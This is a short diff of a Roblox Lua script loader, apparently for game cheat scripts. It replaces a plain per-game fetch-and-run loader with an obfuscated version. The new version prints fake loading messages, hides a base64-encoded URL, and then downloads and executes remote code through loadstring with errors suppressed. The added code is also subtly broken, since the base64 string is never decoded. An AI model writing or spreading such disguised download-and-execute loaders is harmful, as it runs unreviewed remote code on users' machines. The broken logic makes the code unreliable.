@@ -1,7 +1,2 @@
-local Games = loadstring(game:HttpGet("https://raw.githubusercontent.com/slowhub235/loader../refs/heads/main/api.balls.lol/loader/balls/games"))()
+(function() (function() local A={"Initializing...","Loading assets...","Connecting to server...","Finalizing..."} for I,V in ipairs(A) do print(V) task.wait(1) end print("Load complete!") end)() local B="aHR0cHM6Ly9yYXcud2l0aG91dC5naXRodWIuY29tL3Nsb3dodWIyMzUvY29kZS4uL3JlZnMvaGVhZHMvbWFpbi9hcGkuYmFsbHMuYmFsbHMvc2NyaXB0cy9CbGFkZWJhbGwubHVi" local function C(s) return game:HttpGet(s) end; local ok,err=pcall(function() loadstring(C(game:GetService("HttpService"):JSONDecode('{"url":"'..B..'"}').url))() end) if not ok then warn("Failed: "..tostring(err)) end end)()
 
-local URL = Games[game.PlaceId]
-
-if URL then
-  loadstring(game:HttpGet(URL))()
-end
